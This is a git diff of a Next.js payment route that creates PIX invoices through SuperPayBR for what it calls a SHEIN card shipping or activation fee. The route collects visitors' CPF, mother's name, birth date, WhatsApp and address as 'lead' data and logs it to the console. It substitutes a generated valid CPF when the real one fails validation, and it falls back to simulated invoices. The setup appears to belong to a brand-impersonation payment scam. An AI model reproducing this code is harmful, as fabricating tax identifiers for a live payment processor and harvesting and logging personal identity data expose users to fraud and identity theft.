@@ -64,9 +64,9 @@ export async function POST(request: NextRequest) {
     console.log("=== CRIANDO FATURA SUPERPAYBR ===")
 
     const body = await request.json()
-    const { amount, shipping, method, redirect_type = "checkout" } = body
+    const { amount, shipping, method } = body
 
-    console.log("Dados recebidos:", { amount, shipping, method, redirect_type })
+    console.log("Dados recebidos:", { amount, shipping, method })
 
     // Validar dados obrigatórios
     if (!amount) {
@@ -91,19 +91,61 @@ export async function POST(request: NextRequest) {
     const { access_token } = authData.data
 
     // Carregar dados reais do usuário coletados durante o fluxo
-    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
-    const userEmail = request.headers.get("x-user-email") || ""
-    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
-    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")
+    const getUserData = () => {
+      try {
+        const cpfDataStr = request.headers.get("x-cpf-data") || "{}"
+        const cpfData = JSON.parse(cpfDataStr)
+        const userEmail = request.headers.get("x-user-email") || ""
+        const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
+        const deliveryAddressStr = request.headers.get("x-delivery-address") || "{}"
+        const deliveryAddress = JSON.parse(deliveryAddressStr)
+
+        return {
+          nome: cpfData.nome || "Cliente SHEIN",
+          cpf: cpfData.cpf || "12345678901",
+          email: userEmail || "cliente@shein.com.br",
+          telefone: userWhatsApp || "11999999999",
+          dataNascimento: cpfData.dataNascimento || "",
+          nomeMae: cpfData.nomeMae || "",
+          endereco: {
+            rua: deliveryAddress.street || "Rua Exemplo",
+            numero: deliveryAddress.number || "123",
+            complemento: deliveryAddress.complement || "",
+            bairro: deliveryAddress.neighborhood || "Centro",
+            cidade: deliveryAddress.city || "São Paulo",
+            estado: deliveryAddress.state || "SP",
+            cep: deliveryAddress.zipCode?.replace(/\D/g, "") || "01000000",
+          },
+        }
+      } catch (error) {
+        console.log("⚠️ Erro ao carregar dados do usuário, usando fallback:", error)
+        return {
+          nome: "Cliente SHEIN",
+          cpf: "12345678901",
+          email: "cliente@shein.com.br",
+          telefone: "11999999999",
+          endereco: {
+            rua: "Rua Exemplo",
+            numero: "123",
+            bairro: "Centro",
+            cidade: "São Paulo",
+            estado: "SP",
+            cep: "01000000",
+          },
+        }
+      }
+    }
+
+    const userData = getUserData()
 
     console.log("📋 Dados do lead carregados:")
-    console.log("Nome:", cpfData.nome)
-    console.log("CPF:", cpfData.cpf)
-    console.log("Email:", userEmail)
-    console.log("Telefone:", userWhatsApp)
+    console.log("Nome:", userData.nome)
+    console.log("CPF:", userData.cpf)
+    console.log("Email:", userData.email)
+    console.log("Telefone:", userData.telefone)
 
     // Validar e corrigir CPF se necessário
-    let document = cpfData.cpf?.replace(/[^\d]/g, "") || ""
+    let document = userData.cpf?.replace(/[^\d]/g, "") || ""
     if (!validateCPF(document)) {
       console.log("⚠️ CPF inválido, gerando CPF válido para teste")
       document = generateValidCPF()
@@ -119,64 +161,107 @@ export async function POST(request: NextRequest) {
       : `Frete ${method || shipping?.toUpperCase() || "SEDEX"} - Cartão SHEIN`
 
     // Gerar external_id único
-    const externalId = `SPBR_${redirect_type.toUpperCase()}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
+    const externalId = isActivation
+      ? `SHEIN_ACT_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
+      : `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
 
-    // Calcular valor em centavos
-    const amountInCents = Math.round(amount * 100)
-
-    // Gerar PIX payload simulado
-    const pixPayload = `00020101021226580014br.gov.bcb.pix2536${externalId}520400005303986540${amount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304${Math.random().toString(36).substr(2, 4).toUpperCase()}`
-
-    // Dados da fatura
-    const invoiceData = {
-      id: `INV_${Date.now()}`,
-      invoice_id: `SUPERPAYBR_${Date.now()}`,
-      external_id: externalId,
-      pix: {
-        payload: pixPayload,
-        image: "/placeholder.svg?height=250&width=250",
-        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=200&margin=1&format=png`,
+    // Preparar payload SuperPayBR
+    const invoicePayload = {
+      client: {
+        name: userData.nome,
+        document: document,
+        email: userData.email,
+        phone: userData.telefone?.replace(/[^\d]/g, "") || "11999999999",
+        ip: getClientIP(request),
+        address: {
+          street: userData.endereco.rua,
+          number: userData.endereco.numero,
+          district: userData.endereco.bairro,
+          city: userData.endereco.cidade,
+          state: userData.endereco.estado,
+          zipcode: userData.endereco.cep,
+          country: "BR",
+        },
       },
-      status: {
-        code: 1,
-        title: "Aguardando Pagamento",
-        text: "pending",
+      payment: {
+        id: externalId,
+        type: "3", // PIX
+        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
+        referer: externalId,
+        installment: "1",
+        order_url: isActivation ? `${request.nextUrl.origin}/upp/checkout` : `${request.nextUrl.origin}/checkout`,
+        store_url: request.nextUrl.origin,
+        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
+        discount: 0,
+        products: [
+          {
+            id: isActivation ? "activation" : "1",
+            image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
+            title: productTitle,
+            qnt: 1,
+            discount: 0,
+            amount: totalAmount,
+          },
+        ],
       },
-      valores: {
-        bruto: amountInCents,
-        liquido: amountInCents,
+      shipping: {
+        amount: 0,
       },
-      vencimento: {
-        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
-      },
-      type: "real" as const,
-      customer: {
-        name: cpfData.nome || "Cliente",
-        email: userEmail,
-        phone: userWhatsApp,
-        address: deliveryAddress,
-      },
-      redirect_type,
-      created_at: new Date().toISOString(),
     }
 
-    console.log(`✅ Fatura SuperPayBR criada: ${externalId} - R$ ${totalAmount.toFixed(2)}`)
+    console.log("📤 Enviando para SuperPayBR:", JSON.stringify(invoicePayload, null, 2))
 
-    return NextResponse.json({
-      success: true,
-      data: invoiceData,
-      message: "Fatura criada com sucesso",
-    })
-  } catch (error) {
-    console.error("❌ Erro ao criar fatura SuperPayBR:", error)
-    return NextResponse.json(
-      {
-        success: false,
-        error: "Erro ao criar fatura",
-        message: error instanceof Error ? error.message : "Erro desconhecido",
+    // Fazer requisição para SuperPayBR
+    const response = await fetch("https://api.superpaybr.com/v4/invoices", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        Authorization: `Bearer ${access_token}`,
       },
-      { status: 500 },
-    )
+      body: JSON.stringify(invoicePayload),
+    })
+
+    console.log("📥 Resposta SuperPayBR:", {
+      status: response.status,
+      statusText: response.statusText,
+      ok: response.ok,
+    })
+
+    if (response.ok) {
+      const data = await response.json()
+      console.log("✅ Fatura SuperPayBR criada com sucesso!")
+
+      const invoiceData = {
+        id: data.fatura.id,
+        invoice_id: data.fatura.invoice_id,
+        external_id: externalId,
+        pix: {
+          payload: data.fatura.pix.payload,
+          image: data.fatura.pix.image,
+          qr_code: data.fatura.pix.image, // SuperPayBR já retorna a imagem do QR Code
+        },
+        status: data.fatura.status,
+        valores: data.fatura.valores,
+        vencimento: data.fatura.vencimento,
+        secure: data.fatura.secure,
+        type: "real" as const,
+      }
+
+      console.log(`✅ Fatura criada - External ID: ${externalId} - Valor: R$ ${totalAmount.toFixed(2)}`)
+
+      return NextResponse.json({
+        success: true,
+        data: invoiceData,
+        fallback: false,
+      })
+    } else {
+      const errorText = await response.text()
+      console.log("❌ Erro na API SuperPayBR:", response.status, errorText)
+      return createSimulatedInvoice(request, body)
+    }
+  } catch (error) {
+    console.log("❌ Erro ao criar fatura SuperPayBR:", error)
+    return createSimulatedInvoice(request, body)
   }
 }
 
@@ -185,7 +270,7 @@ async function createSimulatedInvoice(request: NextRequest, body: any) {
   const totalAmount = Number.parseFloat(amount?.toString() || "34.90")
   const externalId = `SHEIN_SIM_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
 
-  const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/SIM${Date.now()}520400005303986540${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304SIMS`
+  const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/SIM${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304SIMS`
 
   const simulatedInvoice = {
     id: `SIM_${Date.now()}`,
